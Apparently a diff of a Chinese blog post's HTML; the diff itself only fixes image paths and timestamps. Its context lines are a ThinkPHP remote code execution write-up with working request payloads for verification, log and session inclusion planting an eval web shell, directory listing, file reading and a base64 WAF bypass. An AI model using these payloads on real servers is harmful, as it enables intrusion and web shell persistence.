@@ -156,7 +156,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-09-19 10:03:15
+          2024-09-19 10:08:30
         </span>
         
               <span class="post-tags">
@@ -179,7 +179,7 @@
 <li>网上的很多工具都采用这种方式做漏洞验证，但是这种并没有考虑phpinfo被disable</li>
 </ol>
 <p><strong>aaaaa</strong>=<strong>phpinfo</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918164858827.png" alt="image-20240918164858827" /></p>
+<p><img src="../../../typora-user-images/image-20240918164858827.png" alt="image-20240918164858827" /></p>
 <ol start="2">
 <li>
 <p>xray采用了var_dump的方式，但判断条件写的有些问题，直接匹配字符，导致很多误报。</p>
@@ -191,12 +191,12 @@
 <ul>
 <li>添加规则，判断string和length关键字等等</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918165333020.png" alt="image-20240918165333020" /></p>
+<p><img src="../../../typora-user-images/image-20240918165333020.png" alt="image-20240918165333020" /></p>
 <ul>
 <li>再套一层filter，用常规md5计算（环境都是没开debug的，因此默认也能用）</li>
 </ul>
 <p><strong>aaaaa</strong>=<strong>123456</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>md5</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>post</strong></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919094205025.png" alt="image-20240919094205025" /></p>
+<p><img src="../../../typora-user-images/image-20240919094205025.png" alt="image-20240919094205025" /></p>
 <h1 id="0x02-漏洞利用"><a class="markdownIt-Anchor" href="#0x02-漏洞利用"></a> 0x02 漏洞利用</h1>
 <h2 id="一-assert无法使用"><a class="markdownIt-Anchor" href="#一-assert无法使用"></a> 一、assert无法使用</h2>
 <p>众所周知，php7的assert变成非函数了，也就无法callback调用，达到执行任意代码的效果，这样利用起来就很麻烦了。</p>
@@ -208,27 +208,27 @@
 <pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;data&#x2F;runtime&#x2F;log&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>控制器报错没有记录到日志里面（?s=)，因此可以直接用这个洞，callback的调用位置给加上payload</p>
 <p><strong>aaaaa</strong>=<strong>&lt;</strong>?<strong>php</strong> <strong>phpinfo</strong>();?&gt;&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918171433593.png" alt="image-20240918171433593" /></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918171628457.png" alt="image-20240918171628457" /></p>
+<p><img src="../../../typora-user-images/image-20240918171433593.png" alt="image-20240918171433593" /></p>
+<p><img src="../../../typora-user-images/image-20240918171628457.png" alt="image-20240918171628457" /></p>
 <h3 id="session包含"><a class="markdownIt-Anchor" href="#session包含"></a> session包含</h3>
 <p>设置session</p>
 <pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;c&#39;])?&gt;&amp;server[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172313542.png" alt="image-20240918172313542" /></p>
+<p><img src="../../../typora-user-images/image-20240918172313542.png" alt="image-20240918172313542" /></p>
 <p>linux存tmp</p>
 <pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_ID&amp;c&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>windows看实际情况</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172450829.png" alt="image-20240918172450829" /></p>
+<p><img src="../../../typora-user-images/image-20240918172450829.png" alt="image-20240918172450829" /></p>
 <h4 id="实战遇到的问题"><a class="markdownIt-Anchor" href="#实战遇到的问题"></a> *实战遇到的问题：</h4>
 <p>实战中我们可能考虑使用这种写shell的方式</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918181907270.png" alt="image-20240918181907270" /></p>
+<p><img src="../../../typora-user-images/image-20240918181907270.png" alt="image-20240918181907270" /></p>
 <p>但是我们发现我们写入的session文件变样了</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918182839115.png" alt="image-20240918182839115" /></p>
+<p><img src="../../../typora-user-images/image-20240918182839115.png" alt="image-20240918182839115" /></p>
 <p>跟一下tp的代码：</p>
 <p>发现字段会以. 做区分，因此我们上面的文件名会分隔开</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918182918927.png" alt="image-20240918182918927" /></p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918183023873.png" alt="image-20240918183023873" /></p>
+<p><img src="../../../typora-user-images/image-20240918182918927.png" alt="image-20240918182918927" /></p>
+<p><img src="../../../typora-user-images/image-20240918183023873.png" alt="image-20240918183023873" /></p>
 <p>换个写shell方式即可</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918183107326.png" alt="image-20240918183107326" /></p>
+<p><img src="../../../typora-user-images/image-20240918183107326.png" alt="image-20240918183107326" /></p>
 <h2 id="三-其他利用"><a class="markdownIt-Anchor" href="#三-其他利用"></a> 三、其他利用</h2>
 <h3 id="列目录"><a class="markdownIt-Anchor" href="#列目录"></a> 列目录</h3>
 <p><strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>scandir</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>GET</strong>&amp;<strong>get</strong>[]=<strong>/</strong></p>
@@ -236,14 +236,14 @@
 <ul>
 <li>一是可以根据这个payload判断系统是否为linux（windows默认会列当前盘符跟目录）</li>
 </ul>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172825785.png" alt="image-20240918172825785" /></p>
+<p><img src="../../../typora-user-images/image-20240918172825785.png" alt="image-20240918172825785" /></p>
 <ul>
 <li>二是可以通过payload寻找日志和session等，配合文件读取，可以做的事情很多</li>
 </ul>
 <h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件"></a> 读文件</h3>
 <p>配合列目录可以做的事情有很多，在极端环境下可以拿到很多东西</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>highlight_file<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918173108619.png" alt="image-20240918173108619" /></p>
+<p><img src="../../../typora-user-images/image-20240918173108619.png" alt="image-20240918173108619" /></p>
 <h1 id="0x03-waf绕过"><a class="markdownIt-Anchor" href="#0x03-waf绕过"></a> 0x03 waf绕过</h1>
 <p>日志包含的时候，关键字被拦截怎么办？</p>
 <ul>
@@ -258,9 +258,9 @@
 <p>这篇文章采取了伪协议+字符反转的方式绕过关键字</p>
 <p>如果校验了php标签之类的，那么payload就只能编码写进去，后面就要结合伪协议利用了。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name class-name-fully-qualified static-context">think<span class="token punctuation">\</span>Session</span><span class="token operator">::</span><span class="token constant">set</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYWJjJ10pKTs<span class="token operator">/</span>Pg<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919100313292.png" alt="image-20240919100313292" /></p>
+<p><img src="../../../typora-user-images/image-20240919100313292.png" alt="image-20240919100313292" /></p>
 <p>这里的bb是为了补充base64的位数，后面使用伪协议decode时候可以正确解码到payload。因为session格式是固定的。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20221011121738-a44e4b00-491b-1.png" alt="20221011121738-a44e4b00-491b-1" /></p>
+<p><img src="../../../typora-user-images/20221011121738-a44e4b00-491b-1.png" alt="20221011121738-a44e4b00-491b-1" /></p>
 <h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10397">https://xz.aliyun.com/t/10397</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p>
@@ -279,7 +279,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-09-19 10:03:15
+              2024-09-19 10:08:30
             </span>
             
                   <span class="post-tags">
